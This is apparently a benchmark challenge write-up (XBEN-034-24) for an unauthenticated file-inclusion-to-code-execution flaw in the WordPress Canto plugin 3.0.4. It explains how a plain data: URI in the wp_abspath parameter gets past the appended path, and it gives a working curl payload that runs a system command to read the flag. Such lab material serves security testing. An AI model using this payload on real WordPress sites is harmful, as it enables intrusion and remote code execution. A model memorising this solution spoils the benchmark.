# XBEN-034-24 — Melodic Mayhem

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Unauthenticated Local File Inclusion → Remote Code Execution via the `wp_abspath` parameter in the WordPress "Canto" plugin (v3.0.4).

## Summary

The bundled Canto DAM plugin ships `wp-content/plugins/canto/includes/lib/download.php`, which is reachable directly (no WordPress bootstrap, no authentication) and starts with:

```php
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
```

`wp_abspath` is taken straight from the request and concatenated into a `require_once` path with **no validation whatsoever**. The server's `allow_url_include` is enabled, so the `data://` stream wrapper is accepted by `require_once`. Because the string `'/wp-admin/admin.php'` is appended *after* our controlled value, a `data://...;base64,...` payload breaks (the appended suffix contains `-` which is invalid base64 and the wrapper's strict RFC2397 decoder rejects the whole thing). Using the **non-base64** form of the `data:` URI instead (`data:text/plain,<raw php code>`) avoids that problem: the appended `/wp-admin/admin.php` is simply included as literal trailing text after our PHP's closing `?>` tag, which PHP treats as inert plain-text output rather than code — giving clean unauthenticated RCE.

## Exploit

```bash
curl -s -i "http://localhost:65128/wp-content/plugins/canto/includes/lib/download.php" \
  --data-urlencode 'wp_abspath=data:text/plain,<?php system("cat /FLAG.txt"); ?>' -G
```
